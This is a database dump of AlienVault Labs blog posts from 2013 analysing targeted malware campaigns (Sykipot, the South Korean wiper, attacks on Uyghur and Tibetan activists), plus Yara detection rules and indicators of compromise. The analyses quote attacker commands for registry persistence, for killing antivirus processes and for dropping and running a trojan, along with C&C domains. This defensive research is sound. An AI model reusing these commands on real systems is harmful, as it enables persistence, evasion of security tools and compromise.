suspicious ones are detailed below:​- aafbonus.com registered by [email protected] on 06-19-2012Probably related to American Advertising Federation - http://www.aaf.org/- nceba.org registered by [email protected] on 07-24-2012Probably related to U.S. BANKRUPTCY ADMINISTRATOR - http://www.nceba.uscourts.gov/- pdi2012.org registered by [email protected] on 08-18-2011Probably related to PDI 2012, the premier training event hosted by the American Society of Military Comptrollers- hudsoninst.com registered by [email protected] on 11-26-2012Probably related to the Hudson Institute - http://www.hudson.org/Hudson Institute is a nonpartisan, independent policy research organization dedicated to innovative research and analysis that promotes global security, prosperity, and freedom.CVE-2012-4969 - Internet ExplorerIn September last year, the Sykipot actors registered several domains to exploit a vulnerability in Internet Explorer (CVE-2012-4969).- resume4jobs.net registered by [email protected] on 03-08-2012URL’s involved:http://www[.]resume4jobs[.]net/account/1024486[.]htmlhttp://www[.]resume4jobs[.]net/account/embed[.]htmhttp://www[.]resume4jobs[.]net/jobs[.]exe Sykipot malware that uses info[.]resume4jobs[.]net as the C&C- paypal1.dns1.us - Dynamic DNS providerURL’s involved:http://paypal1[.]dns1[.]us/account/1024486[.]htmlhttp://paypal1[.]dns1[.]us/account/embed[.]htm- pollingvoter.org registered by [email protected] on 06-11-2012URL’s involved:http://www[.]pollingvoter[.]org/ne2012/vote/embed[.]htmhttp://www[.]pollingvoter[.]org/life[.]exe Sykipot malware that uses www[.]betterslife[.]com as the C&C- skyruss.net registered by [email protected] on 04-17-2012URL’s involved:http://social[.]sns[.]skyruss[.]net/variety/index[.]htmlhttp://forum[.]skyruss[.]net/articles/embed[.]htmCVE-2012-1723 - Java 7In August, they were exploiting a vulnerability in Java (CVE-2012-1723) to gain access to the victim’s systems. It seems they were using the Metasploit version of the exploit.Some examples are:- slashdoc.org registered by [email protected] on 05-21-2012URL’s involved:http://www[.]slashdoc[.]org/default[.]jarhttp://www[.]slashdoc[.]org/index[.]htmlThe index.html page loads the malicious Java applet and it passes the payload they want to execute using the data parameter (the value is hex encoded):In this case the host www[.]photosmagnum[.]com was used as the C&C server.- nceba.org registered by [email protected] on 07-24-2012URL’s involved:http://www[.]nceba[.]org/newsroom/article/news201207240251[.]htmlhttp://www[.]nceba[.]org/newsroom/article/default[.]jarUsing www[.]betterslife[.]com as the C&C server.- milstars.org registered by [email protected] on 06-20-2012URL’s involved:http://milstars[.]org/view/default[.]jarCVE-2013-0640 - PDF Exploit targeting Japanese victimsWe found the Sykipot actors using the latest Adobe Acrobat exploit (CVE-2013-0640) a few weeks ago.The version of the exploit is the same that we found in our latest blog post:- Latest Adobe PDF exploit used to target Uyghur and Tibetan activistsThe Javascript code inside the PDF file is very similar to the one found in the Itaduke samples but part of the initial variables and the obfuscation has been removed from the original one.Once the PDF is opened the following lure file is displayed to the victim:Based on the content of the lure document the potential victims seem to be somehow related to the Japanese Ministry of Health, Labour and WelfareOnce the infection takes place the following files are created on the system:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\pfilede.dat 5ED3A94354F27BC7AF0FEF04F89D8EB8\\DOCUME~1\\ADMINI~1\\LOCALS~1\\mpr.dll 84EFAFF343CF7A34D2A0D847A1E5FD50\\DOCUME~1\\ADMINI~1\\LOCALS~1\\setm.ini 00051F392350128BA4DD4CA10F44DDEF\\DOCUME~1\\ADMINI~1\\LOCALS~1\\temp.dll BEA84BE4BFE236652F6A4E382B21A96FThe file setm.ini contains the configuration of Sykipot in this case:[srv_info]sleeptime=3600000url=bassball[.]peocity[.]com (C&C server)scexe=rsvp.exescdll=mpr.dllrunexe=run.exemark=0304adbhThe following actions take place in the system:cmd /c reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v start /t REG_SZ /d [sykipot_payload_file].exe -startup /f (persistence)Several functions are called within the Sykipot’s DLL:[sykipot_payload_file].exe -startupEx[sykipot_payload_file].exe -startup1cmd /c [sykipot_payload_file].exe -startupThen the malicious payload will be injected into Internet Explorer.The malware will communicate with the C&C server once in a while using SSL and the well known communication paths of previous Sykipot payloads:/kys_allow_put.asp?type=/kys_allow_get.asp?name=As we showed in the past most of the Sykipot samples used the key “19990817” for encryption.In this sample we have found a new key “20120709” that is also a date.InfrastructureAlong with the blog post we are making a list of new domains public that weren’t mentioned in previous Sykipot research:Unique malicious domains:peocity.comrusview.netskyruss.netcommanal.netnatareport.comphotogellrey.comphotogalaxyzone.cominsdet.comcreditrept.compollingvoter.orgdfasonline.comhudsoninst.comwsurveymaster.comnhrasurvey.orgpdi2012.orgnceba.orglinkedin-blog.comaafbonus.commilstars.orgvatdex.cominsightpublicaffairs.orgapplesea.netappledmg.netappleintouch.netseyuieyahooapis.comappledns.netemailserverctr.comdailynewsjustin.comhi-tecsolutions.orgslashdoc.orgphotosmagnum.comresume4jobs.netsearching-job.netservagency.comgsasmartpay.orgtech-att.comWe are releasing Snort rules to detect queries to the malicious domains in your network:Thanks to EmergingThreats http://www.emergingthreats.net/ [no longer available] for the help. You will find the rules in its ruleset update today as well.Based in our research, below is the list of unique e-mail addreses used to registered malicious domains:[email protected][email protected][email protected][email protected][email protected][email protected][email protected][email protected][email protected][email protected][email protected][email protected][email protected][email protected][email protected][email protected][email protected][email protected][email protected]Apart from the list of new domains you should check out the domains mentioned in the following articles that all related to previous Sykipot’s activity but some of them are still being used in Sykipot’s operations:- Sykipot is back - Alienvault Labs- The Sykipot Attacks - Symantec- The Sykipot Campaign - TrendMicro- Hurricane Sandy serves as lure to deliver Sykipot - Verizon- Insight into Sykipot Operations - Symantec', 'sykipotcve-2013-0640cve-2012-1889cve-2012-1723cve-2012-4969', '/blogs/labs-research/new-sykipot-developments');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (68, 'A theory on the South Korean attacks', 'Jaime Blasco', 'March 20, 2013 ', 'During the day I’ve been thinking about what have just happened in South Korea.It is a very simple piece of code that overwrites the MBR (Master Boot Record) making the affected system unable to start after reboot.Other companies have published information about the wiper payloads but anyone is giving information about how the attackers gained access to the affected networks. To execute that payload they had to gain access to the companies somehow and execute the wiping routine at the same time in the affected computers.If the goal of the attackers was to create panic it means they hadn’t to have a specific list of victims, had they?.  From my point of view one of the easiest ways to gain access to several targets without having too much resources/skills would be:- Buy an exploit kit and a malware kit, hack into websites and redirect victims to your malicious infrastructure.or even better:- Rent a botnet(s) that have access to hundreds of computers and try to find victims inside interesting targets.We have seen in the past that large botnets like Zeus or other financial driven botnets had access to systems within the networks of large organizations such as Bank of America, Amazon and NASA.Therefore, finding infected systems in Broadcasting & Cable companies in South Korea like KBS, MBC and YTN (victims of the attacks) inside fraud botnets wouldn’t be unusual, would it be?.The fact is that after reading some of the Korean news about the attacks:- http://www.zdnet.co.kr/news/news_view.asp?artice_id=20130320185309I found they mentioned several filenames that were involved on the attacks such as apcruncmd.exe, imbc.exe, sbs.exe, kbs.exe, Bull.exe, Sun.exe, asd.exe, 38.exe, 39.exe, Sad.exe, down.exe, v3lite.exe.Armed with patience we began the search of pieces of malware that could generate those filenames and also be related to South Korea.The first file we found was b7c6caddb869d8c64e34478223108c605c28c7b725f4d1f79e19064cffca74fa that was submitted to VirusTotal two days ago from South Korea.When the binary is executed, it creates the following files in the system:- \\Local Settings\\Temp\\1.tmp\\bat.bat- \\WINDOWS\\Temp\\125.exe- \\Temp\\imbc.exeThe content of the bat file is:  Basically it clears the DNS cache for Internet Explorer and modifies the etc/hosts file adding new entries.When the victim resolves the South Korean bank’s domain names included in the modified “etc/hosts” file, the domains will point to 103.14.114.156.It seems the malware is also starting the Task Scheduler service using the command “net start Task Scheduler” probably to create some tasks with malicious purposes.Finally it creates an autostart registry key to maintain persistence.The malware connects to the host home1[.]hades08[.]com (126.7.217.163)We have found several samples with the same behavior and using the same filename (imbc.exe) and connecting to similar C&C servers, examples:- home2[.]hades08[.]com (126.7.217.163)- home3[.]hades08[.]com (126.7.217.163)Other suspicious binaries matching the patterns we were looking for and submitted from South Korean in the last few days were:11f6569e3453dbf2c8c392a1bf653c84e7b2dbc6d90a22936c95bf843bfcda73 -Filename: kbs.exeSigcheck:publisher….............: nhncorpproduct…...............: nhncorpinternal name….........: nhncorpfile version…..........: 1,0,0,0copyright….............: nhncorpdescription…...........: nhncorp0b445a03690cd857079577da29860c8b036f084a09885bb01499df553e3640c5Filename: v3lite.exeConnects to 121.156.58.135All the files we mentioned are from the same malware family for sure, they have very similar behaviours with some slightly differences and their filenames match with the list we found in the South Korean news. Some vendors call this family Win32.Morix.Chinese packer/languageThe domain hades08[.]com was registered by [email protected] a week ago.We found the following subdomain:ddd[.]hades08[.]com that seems to be serving a version of the Chinese Exploit Kit named GonDad:http://urlquery.net/report.php?id=1528549According to Google it infected the domain blogermoney[.]comWe found another website, d41[.]asdasd2012[.]com serving the GonDad exploit kit.http://urlquery.net/report.php?id=1528774The domain registrant for asdasd2012[.]com is also [email protected] and it was registered a day after hades08[.].comThe relationship is obvious because dl[.]hades08[.]com is know pointing to the same IP address as mb[.]asdasd2012[.]com (126.7.217.163)According to Google, the domain asdasd2012[.]com has infected 4 domains in the past 90 days including a South Korean website, appstory.co.kr.On the other hand if we get the IP address of the C&C server for the sample with filename v3lite.exe we previously mentioned, 121.156.58.135.Using passive DNS we can found the following subdomains of frcvb[.]com pointed to that IP in the last few days:tt[.]frcvb[.]com A 121[.]156[.]58[.]135aaa[.]frcvb[.]com A 121[.]156[.]58[.]135qqq[.]frcvb[.]com A 121[.]156[.]58[.]135ttt[.]frcvb[.]com A 121[.]156[.]58[.]135zzz[.]frcvb[.]com A 121[.]156[.]58[.]135The domain frcvb[.]com was registered less that a month ago.According to Google, the domain frcvb[.]com has infected 18 domains in the past 90 days including several South Korean websites:koreanmovie.com/chinawoo.kr/Other domain that we have detected in the same infrastructure is frcob[.]com and it is being used as C&C server for the same malware we previously mentionedhttp://www.threatexpert.com/report.aspx?md5=1b40b1ff80738ec2fe5747a28d9726a1As another example the following SK websites were also affected by the GonDad exploit kit hosted on frcob[.]com and frcvb[.]com:www.knbox.comwww.keduac.co.krraya.co.krchinawoo.krgoam.co.krbohumbest.netSummaryThe fact is we could probably show you dozens of domains hosting versions of the GonDad exploit kit, affecting South Korean websites and related with the malware  family we have been talking about.It means that hundreds of South Korean websites are pointing to the GonDad exploit kit and probably thousands of South Korean users have been compromised and they are part of a botnet.If the people behind yesterday’s South Korean attacks had access to some of the infrastructure we have detailed in the blog post, they could have gained access to hundreds if not thousands of South Korean systems and then they could have chosen which of the compromised systems were in interesting companies. Then they could have manually upload another payload to each of the systems and the could have performed lateral movement to own the network. Once they are in the network they can easily execute the wiping payload.You should take into account that this is only a theory and it could even be a very small part of all the infrastructure they could have used. Maybe this is only an example and they also bought the service or access to other Exploit kits/botnets as well (Blackhole, Zeus, Koobface…).On the other hand both the Exploit kit and the malware mentioned seems to come from China but the attackers could have bought/rent it in the black market. The addresses used to register some of the related domain names were also Chinese ones.', '', '/blogs/labs-research/a-theory-on-the-south-korean-attacks');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (69, 'Information about the South Korean banks and media systems attacks', 'Jaime Blasco', 'March 20, 2013 ', 'As many of you would probably know several South Korean banks and media companies have been affected by an attack that has wiped several systems.It seems the South Korean security company Nshc has published more details on his Facebook PageBased on the samples we collected, the malware overwrites the MBR (Master Boot Record) of the system. After reboot the system can’t boot anymore.The samples use the word “HASTATI” to overwrite the MBR data:And then shuts down the system using:shutdown -r -t 0We have seen that the samples checks for the presence of several security tools:AhnLab Policy Agent - pasvc.exeHauri ViRobot - clisvc.exeAnd tries to kill them using taskkill:taskkill /F /IM pasvc.exetaskkill /F /IM clisvc.exeWithin the samples we found references to three words:PRINCPESHASTATI.NCPESAccording to Wikipedia. “Hastati (singular: Hastatus) were a class of infantry in the armies of the early Roman Republic who originally fought as spearmen, and later as swordsmen. They were originally some of the poorest men in the legion, and could afford only modest equipment—light armour and a large shield, in their service as the lighter infantry of the legion. Later, the hastati contained the younger men rather than just the poorer, though most men of their age were relatively poor. Their usual position was the first battle line. They fought in a quincunx formation, supported by light troops. They were eventually done away with after the Marian reforms of 107 BC”Related samples:ApcRunCmd.exe db4bbdc36a78a8807ad9b15a562515c4OthDown.exe 5fcd6e1dace6b0599429d913850f03640a8032cd6b4a710b1771a080fa09fb87f0e045210e3258dad91d7b6b4d64e7f3', '', '/blogs/labs-research/information-about-the-south-korean-banks-and-media-systems-attacks');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (70, 'Latest Adobe PDF exploit used to target Uyghur and Tibetan activists', 'Jaime Blasco', 'March 14, 2013 ', 'Last month Adobe released a fix to patch a vulnerability that was being exploited in the wild. Kaspersky found that the 0day was being used by a very sophisthicated group to target different governments  using a malware called MiniDuke.Alienvault Labs have detected that a different group of attackers have been using this vulnerability to target non-governmental and human rights organizations.Together with our partner Kaspersky Labs we are releasing an analysis of this campaign. You can read his report here.Based on the samples we found we believe this group has been running a SpearPhishing campaign from the last few weeks. The files we have analyzed are PDF files that contain code to exploit CVE-2013-0640. Once the victim opens the file, the system gets infected and a lure document is displayed to the victim. Some of the PDF lures we have found are:    Some of the exploit filenames:2013-Yilliq Noruz Bayram Merikisige Teklip.pdf联名信.pdfarp.pdfBased on the lures we found it seems the same group is targeting both Tibet and Uyghur activists in the same campaign.The Javascript code inside the PDF files is very similar to the one found in the Itaduke samples but part of the initial variables and the obfuscation has been removed from the original one.The shellcode will create the file AcroRd32.exe in the Temp folder. That file decrypts an encrypted block using XOR operations with the key “[email protected]”.The malicious payload will perform the following operations:- Copy \\WINDOWS\\system32\\wuauclt.exe to %APPDATA%\\wuauclt\\wuauclt.exe- Drop a malicious DLL under %APPDATA%\\wuauclt\\clbcatq.dll- Execute %APPDATA%\\wuauclt\\wuauclt.exeNote that wuauclt.exe is a benign system executable. Once the system file is executed, the malicious DLL will be loaded. This technique is known as DLL search order hijacking.The malicious DLL will be loaded when wuauclt.exe is executed. It is important to show that clbcatq.dll is not exporting all the methods that the original clbcatq.dll has. It only implements the ones that are required to run the malicious code:Original DLL                                                                       Malicious DLL    Once the malicious DLL is loaded, the malicious code will generate the following HTTP request:  The server will reply with an encrypted block of code that will be decrypted. The decrypted content is actually a DLL that exports the following functions:GetWorkTypeInfectFileThe payload will drop the following files:\\WINDOWS\\system32\\wbem\\4BA5E980.PBK\\WINDOWS\\system32\\wbem\\mstd32.dllThe InfectFile function will modify some code in the system library WINDOWS\\system32\\mswsock.dll. If we take a look at the patched DLL:Original versionModified version:If we take a look at WSPStartup_0:We can see how the malicious DLL mstd32.dll will be loaded everytime the system library mswsock.dll is loaded by a program.The file mstd32.dll is signed using a certificate issued to “YNK JAPAN Inc. We have seen that certificate being used to sign malware dropped in several NGO attacks in the past.  Then the malicious code will perform the following HTTP request every few seconds: The final payload is detected as Trojan.Win32.Swisyn and it has a lot of functionality to monitor and steal data from the infected system.We have identified the following C&C servers for both payloads:ly.micorsofts.netip.micrsofts.comxdx.hotmal1.comhy.micrsofts.comAll the DNS names are pointing to 60.211.253.28 at this time. Both domains have been registered using the same mail address:micorsofts.netCreated: 2008-05-12 01:51:10Expires: 2013-05-12 01:51:10Last Modified: 2012-05-02 13:26:38Registrant Contact:GW SYli wen li wen ([email protected])zq djjiningshi, shandongsheng, cn 272000P: +86.05372178000 F: +86.05372178000hotmal1.comCreated: 2008-12-30 03:53:18Expires: 2013-12-30 03:53:18Last Modified: 2012-12-26 15:32:15Registrant Contact:GW SYli wen li wen ([email protected])zq djshixiaqu, beijingshi, cn 272000P: +86.02227238836601 F: +86.02227238836601Profile of the user on 20cn.netWe - Alienvault Labs- have written some Snort rules to match the network behavior:    You can use the following Yara rule to match the malicious binaries:  And this one to detect the malicious PDF files:  Finally, we are releasing some OpenIOC indicators as well: You can find all the content in our GitHub repository.', 'apttibetcve-2013-0640ynk japanuyghur', '/blogs/labs-research/latest-adobe-pdf-exploit-used-to-target-uyghur-and-tibetan-activists');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (71, 'Yara rules for APT1/Comment Crew malware arsenal', 'Jaime Blasco', 'February 20, 2013 ', 'I’m sure all of you have heard about Mandiant’s APT1 report published yesterday. As many of you probably know we have been tracking and exposing this group for a long time as well as other individuals and companies in the security industry. A couple of examples are:http://labs.alienvault.com/labs/index.php/2012/win32coswid/ Win32/Coswid [no longer available]During the last few years we have been producing content that we have used to track and detect Comment Crew’s artifacts such as Snort rules, Yara rules and IOCs. We have decided to publish some of this content and we’ve completed our information with the great intel Mandiant published.  The first package we are releasing is a set of 81 Yara rules that will help malware analysts and incident responders to detect, classify and track the malware arsenal used by Comment Crew.Some of these rules have been built to specifically detect Comment Crew’s tools and others are more generic.You can download the rules from here.How can I use the rules?The easiest way to use this content is installing Yara (http://code.google.com/p/yara-project/). Once installed you can use the cmd tool yara to  detect and classify files in your dataset. Example:$ ../yara-1.6/yara apt1-2.yara files/APT1_WEBC2_CLOVER files//01114c2b1212524c550bbae7b2bf9750aba70c7c98e2fda13970e05768d644cfEclipseSunCloudRAT files//021b4ce5c4d9eb45ed016fe7d87abe745ea961b712a08ea4c6b1b81d791f1ecaAPT1_TARSIP_ECLIPSE files//021b4ce5c4d9eb45ed016fe7d87abe745ea961b712a08ea4c6b1b81d791f1ecaAPT1_WEBC2_Y21K files//02601a267fe980aed4db8ac29336f7ecf1e06f94e9ac0714e968b64586624898APT1_WEBC2_CSON files//02601a267fe980aed4db8ac29336f7ecf1e06f94e9ac0714e968b64586624898APT1_b64_cnc_commands files//02601a267fe980aed4db8ac29336f7ecf1e06f94e9ac0714e968b64586624898APT1_WEBC2_Y21K files//060764506ad9134d5900fc0cd160fc14de80682f1861a3ef084c7c91a734881fAPT1_b64_cnc_commands files//060764506ad9134d5900fc0cd160fc14de80682f1861a3ef084c7c91a734881fSTARSYPOUND_APT1 files//082323fd0f3d24f8fe31895ad1246ae2116aee78d01be83a28c3cbb856541003APT1_SY files//082323fd0f3d24f8fe31895ad1246ae2116aee78d01be83a28c3cbb856541003APT1_WARP files//08af44d381df5250323cf196444aa90597f8049dad55712fe45e80b1a8d8cdedAPT1_points files//08af44d381df5250323cf196444aa90597f8049dad55712fe45e80b1a8d8cdedAPT1_readynewcmd files//0963ba541d56b9805713aa13d955b91f6bb875318698ba6119d5944d68c45afbHACKSFASE2_APT1 files//0b9ca6fb32fcde1e6e55e8874982a2a921e73c6ebdf7246177fecf63542a4a83ccrewSSLBack1 files//0b9ca6fb32fcde1e6e55e8874982a2a921e73c6ebdf7246177fecf63542a4a83APT1_WEBC2_YAHOO files//0c50ddf7295d4ddfafae479e7c3ce21ca6416442c0c8c5e90aedbb3e583a8b20APT1_uagent_iphone85 files//0c50ddf7295d4ddfafae479e7c3ce21ca6416442c0c8c5e90aedbb3e583a8b20APT1_letusgo files//0c50ddf7295d4ddfafae479e7c3ce21ca6416442c0c8c5e90aedbb3e583a8b20APT1_WEBC2_QBP files//0c8ad4824264dd09b3be02f462f968729bf7339438bf5fa69af9ca995353f6dfAPT1_WEBC2_GREENCAT files//0e829513658a891006163ccbf24efc292e42cc291af85b957c1603733f0c99d4On the other hand there are several projects and products that support Yara as a format. Here are some examples:- JSUnpack- Virustotal VTMIS- Volatility- FireeyeWe’ve reviewed the rules to minimize false positives but please send us your feedback and we will improve the Yara rules with that information.Here is the complete list of Yara rules released:LIGHTDART_APT1AURIGA_APT1AURIGA_driver_APT1BANGAT_APT1BISCUIT_GREENCAT_APT1BOUNCER_APT1BOUNCER_DLL_APT1CALENDAR_APT1COMBOS_APT1DAIRY_APT1GLOOXMAIL_APT1GOGGLES_APT1HACKSFASE1_APT1HACKSFASE2_APT1KURTON_APT1LONGRUN_APT1MACROMAIL_APT1MANITSME_APT1MINIASP_APT1NEWSREELS_APT1SEASALT_APT1STARSYPOUND_APT1SWORD_APT1thequickbrow_APT1TABMSGSQL_APT1CCREWBACK1TrojanCookies_CCREWGEN_CCREW1EliseEclipseSunCloudRATMoonProjectccrewDownloader1ccrewDownloader2ccrewMiniaspccrewSSLBack2ccrewSSLBack3ccrewSSLBack1ccrewDownloader3ccrewQAZmetaxcdMiniASPDownloaderPossibleCCrewAPT1_MAPIGETAPT1_LIGHTBOLTAPT1_GETMAILAPT1_GDOCUPLOADAPT1_WEBC2_Y21KAPT1_WEBC2_YAHOOAPT1_WEBC2_UGXAPT1_WEBC2_TOCKAPT1_WEBC2_TABLEAPT1_WEBC2_RAVEAPT1_WEBC2_QBPAPT1_WEBC2_KT3APT1_WEBC2_HEADAPT1_WEBC2_GREENCATAPT1_WEBC2_DIVAPT1_WEBC2_CSONAPT1_WEBC2_CLOVERAPT1_WEBC2_BOLIDAPT1_WEBC2_ADSPACEAPT1_WEBC2_AUSOVAPT1_WARPAPT1_TARSIP_ECLIPSEAPT1_TARSIP_MOONAPT1_aspnetreportAPT1_Revird_svcAPT1_letusgoAPT1_dbg_messAPT1_known_malicious_RARSilentUpdate (02/22/2013): We have improved the ruleset, update to the latest version!', 'yarafireeyeapt1commentcrewvolatilityjsunpack', '/blogs/labs-research/yara-rules-for-apt1-comment-crew-malware-arsenal');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (72, 'Cyber espionage campaign against the Uyghur community, targeting MacOSX systems', 'Jaime Blasco', 'February 13, 2013 ', 'During the last few days together with our colleagues from Kaspersky Lab we have been investigating a new strain of spearphishing mails sent to the Uyghur community. You can read their analysis here.The mails sent contain a Microsoft Office .doc file that exploits MS09-027 affecting Microsoft Office for Mac, this is the same http://labs.alienvault.com/labs/index.php/2012/ms-office-exploit-that-targets-macos-x-seen-in-the-wild-delivers-mac-control-rat/ [no longer available] exploit used in other attacks we discovered in the past.During the last year we reported a couple of attacks targeting Uyghurs:- http://labs.alienvault.com/labs/index.php/2012/new-macontrol-variant-targeting-uyghur-users-the-windows-version-using-gh0st-rat/ [no longer available] New MaControl variant targeting Uyghur users, the Windows version using Gh0st RATSimilar attacks have been reported against various ethnic groups like the Tibetan people and other NGOs and human rights organizations:- http://labs.alienvault.com/labs/index.php/2012/targeted-attacks-against-tibet-organizations/ [no longer available] Targeted attacks against Tibet organizations- http://labs.alienvault.com/labs/index.php/2012/ms-office-exploit-that-targets-macos-x-seen-in-the-wild-delivers-mac-control-rat/ [no longer available] MS Office exploit that targets MacOS X seen in the wild – delivers “Mac Control” RATThey have even http://labs.alienvault.com/labs/index.php/2012/alienvault-research-used-as-lure-in-targeted-attacks/ [no longer available] used our research as lure to target non-governmental organizations.Some of the filenames used in this campaign are:WUC Hacking Emails.docConcerns over Uyghur People.docHosh Hewer.docJenwediki yighingha iltimas qilish Jediwili.docJenwediki yighingha iltimas qilish Jediwili.doclist.docPress Release on Commemorat the Day of Mourning.docThe Universal Declaration of Human Rights and the Unrecognized Population Groups.docUyghur Political Prisoner.docDeported Uyghurs.docKadeer Logistics detail.docJenwediki yighingha iltimas qilish Jediwili(Behtiyar Omer).docAn easy way to identify the documents is looking for the “author” of the document that is always “captain”. This author has been used several times in the past to perform similar attacks. The following yara rule can be used to identify those files:rule CaptainWord {\n\n    strings:\n\n         $header = {D0 CF 11 E0 A1 B1 1A E1}\n\n         $author = {00 00 00 63 61 70 74 61 69 6E 00}\n\n    condition:\n\n         $header at 0 and $author\n\n}Once the victim opens the document the exploit is triggered and the shellcode writes several files on the temporary directory (”/tmp/):1154/0x2610:  fstat(0x26, 0xBFFF4CD0, 0x200)            = 0 0\n\n1154/0x2610:  lseek(0x26, 0x6600, 0x0)          = 26112 0\n\n1154/0x2610:  open(\"/tmp/l.sh\\0\", 0x602, 0x1FF)                 = 40 0\n\n1154/0x2610:  open(\"/tmp/l\\0\", 0x602, 0x1FF)            = 41 0\n\n1154/0x2610:  open(\"/tmp/l.doc\\0\", 0x602, 0x1FF)                = 42 0\n\n1154/0x2610:  read(0x26, \"#!/bin/bash\\nsleep 1\\n/usr/bin/open /tmp/l.doc\\ncp /tmp/l /tmp/m\\n/tmp/m\\0\", 0x44)            = 68 0\n\n1154/0x2610:  write(0x28, \"#!/bin/bash\\nsleep 1\\n/usr/bin/open /tmp/l.doc\\ncp /tmp/l /tmp/m\\n/tmp/m\\0\", 0x44)           = 68 0\n\n1154/0x2610:  read(0x26, \"\\312\\376\\272\\276\\0\", 0x100)           = 256 0\n\n1154/0x2610:  write(0x29, \"\\312\\376\\272\\276\\0\", 0x100)          = 256 0\n\n...\n\n1188/0x2731:  open(\"/tmp/l\\0\", 0x0, 0x0)                = 4 0\n\n1188/0x2731:  open(\"/tmp/m\\0\", 0x401, 0x0)              = 19 0\n\n…Then the bash file is executed opening both the trojan and a lure document. There are several lure documents all related with Uyghur activities, an example is:  It is also funny that one of the lure documents talks about the “Rise in possible State-Sponsored hacking”.Once executed the malware will try to write both the pslist and the backdoor itself under the LaunchAgents directory. This folder is used by MacOSX to store the configuration files that define the parameters of services run by launchd. It will try both under the system and the current user directory: Then the command “launchctl load” is used to register the new new daemon. The contents of the apple.pslist file are as follow:<?xml version=“1.0” encoding=“UTF-8”?><!DOCTYPE plist PUBLIC “-//Apple//DTD PLIST 1.0//EN” “http://www.apple.com/DTDs/PropertyList-1.0.dtd”><plist version=“1.0”><dict><key>KeepAlive</key><true/><key>Label</key><string>apple</string><key>Program</key><string>/Users/operator1/library/launchagents/.systm</string><key>ProgramArguments</key><array><string>/Users/operator1/library/launchagents/.systm</string><string>1</string><string>2</string><string>3</string><string>4</string></array><key>RunAtLoad</key><true/></dict></plist>The backdoor contains code from a tool called “Tiny SHell”. You can download the source code of “Tiny SHell” here. You will recognize some of the function names from the source code:      The configuration values are hardcoded in the binary including the encryption key and the C&C address/port:“Tiny SHell” uses AES encryption for the C&C communications and as we can see the attackers are using “12345678” as the AES secret key:  On the other hand they decided to use the original challenge responses that can be found in the original pel.c file:The backdoor has only a couple of functionalities:- Remote shell execution- File transfers (get/put)Most of the binaries we obtained  were compiled using debug symbols so we were able to obtain some debug paths from the machine where the files were compiled:/Users/cbn/Documents/WorkSpace/design/server/aes.c/Users/cbn/Documents/WorkSpace/design/server/build/server.build/Release/server.build/Objects-normal/i386/aes.o/Users/cbn/Documents/WorkSpace/design/server/build/server.build/Release/server.build/Objects-normal/i386/pel.o/Users/cbn/Documents/WorkSpace/design/server/build/server.build/Release/server.build/Objects-normal/i386/server.o/Users/cbn/Documents/WorkSpace/design/server/build/server.build/Release/server.build/Objects-normal/i386/sha1.o/Users/cbn/Documents/WorkSpace/design/server/build/server.build/Release/server.build/Objects-normal/i386/shell.o/Users/cbn/Documents/WorkSpace/design/server/build/server.build/Release/server.build/Objects-normal/ppc/aes.o/Users/cbn/Documents/WorkSpace/design/server/build/server.build/Release/server.build/Objects-normal/ppc/pel.o/Users/cbn/Documents/WorkSpace/design/server/build/server.build/Release/server.build/Objects-normal/ppc/server.o/Users/cbn/Documents/WorkSpace/design/server/build/server.build/Release/server.build/Objects-normal/ppc/sha1.o/Users/cbn/Documents/WorkSpace/design/server/build/server.build/Release/server.build/Objects-normal/ppc/shell.o/Users/cbn/Documents/WorkSpace/design/server/pel.c/Users/cbn/Documents/WorkSpace/design/server/server.m/Users/cbn/Documents/WorkSpace/design/server/sha1.c/Users/cbn/Documents/WorkSpace/design/server/shell.cWhere “cbn” is the username of the user who compiled those files in the attacker’s system.The backdoor also writes a VCard containing the data about the current user. The purpose of this is not clear.Network activityThe attackers are using two different C&C domains:- apple12[.]crabdance[.]com- update[.]googmail[.]orgThe domain crabdance[.]com is a well known free Dynamic DNS provider. We have been monitoring the second domain googmail[.]org for a while. It has been used by a group we internally named as “xsldmt” due to the mail address they use to register most of their domain names the use.Domain Name:GOOGMAIL.ORGCreated On:16-Dec-2011 03:01:13 UTCLast Updated On:20-Nov-2012 04:46:22 UTCExpiration Date:16-Dec-2013 03:01:13 UTCSponsoring Registrar:Xin Net Technology Corporation (R118-LROR)Status:OKRegistrant ID:4jyn2c9u84snj4Registrant Name:su guangRegistrant Organization:su guangRegistrant Street1:mi quannanguoxiang1haoRegistrant Street2:Registrant Street3:Registrant City:changjihuizuzizhizhouRegistrant State/Province:xinjiangweiwuerzizhiquRegistrant Postal Code:830000Registrant Country:CNRegistrant Phone:+86.013579984824Registrant Phone Ext.:Registrant FAX:+86.09914682953Registrant FAX Ext.:Registrant Email:[email protected]The following graph represents the passive DNS data we collected from the ip addresses involved including other potential domains that are probably being used by the same group.Indicators of compromiseApart from the domain names and ip addresses we released that can be used to check your logs for connections to those addresses, here is a list of file paths that can be checked in your systems to find activity related to these attacks:/tmp/l\n\n/tmp/m\n\n/tmp/l.sh\n\n/tmp/l.doc\n\n/tmp/systm\n\n/tmp/.systm\n\n/tmp/__system\n\n/tmp/__system*\n\n/tmp/tmpAddressbook.vcf\n\n/Library/LaunchDaemons/systm\n\n/Library/LaunchDaemons/.systm\n\n/Library/LaunchDaemons/apple.plist\n\n/Users/[CurrentUser]/Library/LaunchAgents/systm\n\n/Users/[CurrentUser]/Library/LaunchAgents/.systm\n\n/Users/[CurrentUser]/Library/LaunchAgents/apple.plist', 'macosxofficebackdoorms09-027', '/blogs/labs-research/cyber-espionage-campaign-against-the-uyghur-community-targeting-macosx-syst');
